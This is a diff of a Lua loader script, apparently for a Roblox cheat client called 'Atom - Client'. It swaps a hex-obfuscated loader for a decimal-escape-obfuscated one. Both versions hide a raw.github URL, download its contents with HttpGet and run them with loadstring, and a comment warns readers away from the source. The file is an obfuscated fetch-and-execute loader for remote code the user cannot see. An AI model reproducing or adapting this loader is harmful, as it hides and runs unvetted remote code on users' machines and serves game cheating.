@@ -14,53 +14,27 @@
 ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝]]
 -- Please leave this page as you have attempted to view the source code of Atom - Client.
 
--- Непонятные имена для функций и переменных
-local x0 = "68747470733a2f2f7261772e6769746875622e636f6d2f736466333237336564333865793233386432336432386432337564396a333839647532336a642f3266343537686b6433323361746f6d2f6d61696e2f536f66742e6c7561"
-local x1 = "4777696e486b68774f6d6b7a4668"
-local x2 = "4c6d77356c6b6466725978647a5161"
+local x1 = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
 
--- Функция для декодирования шестнадцатеричных строк
-local function x3(s)
-    return (s:gsub('..', function(cc)
-        return string.char(tonumber(cc, 16))
-    end))
-end
-
--- Декодируем строки
-local x4 = x3(x0)
-local x5 = x3(x1)
-local x6 = x3(x2)
-
--- Дополнительное шифрование ключевых слов
-local function x7(s)
-    return (s:gsub('.', function(c)
-        return string.char(((string.byte(c) - 33 + 94) % 94) + 33)
-    end))
-end
-
--- Дополнительные уровни шифрования
-local x8 = x7(x1)
-local x9 = x7(x2)
-
--- Выполняем загрузку и выполнение кода
-local success, script = pcall(function()
-    local content = getfenv()[x8](game, x4)
-    if content then
-        warn("Successfully loaded script")
-        return content
-    else
-        warn("Failed to load script")
-        return nil
+local function x2(x3)
+    local x4 = ""
+    for x5 in x3:gsub("\\(%d+)", string.char):gmatch(".") do
+        x4 = x4 .. x5
     end
-end)
-
-if success and script then
-    local success, result = pcall(loadstring(script))
-    if success then
-        warn("Script executed successfully")
+    return x4
+end
+local function x6(x7)
+    local x8 = game:HttpGet(x7)
+    if x8 then
+        warn("\76\97\117\110\99\104\105\110\103\32\65\116\111\109\32\45\32\67\108\105\101\110\116")
+        loadstring(x8)()
     else
-        warn("Failed to execute script:", result)
+        warn("\67\97\110\39\116\32\108\111\97\100\32\65\116\111\109\32\45\32\67\108\105\101\110\116")
     end
+end
+local x9 = x2(x1)
+if x9 then
+    x6(x9)
 else
-    warn("Failed to load or execute script")
+    warn("\67\97\110\39\116\32\108\111\97\100\32\65\116\111\109\32\45\32\67\108\105\101\110\116\46")
 end
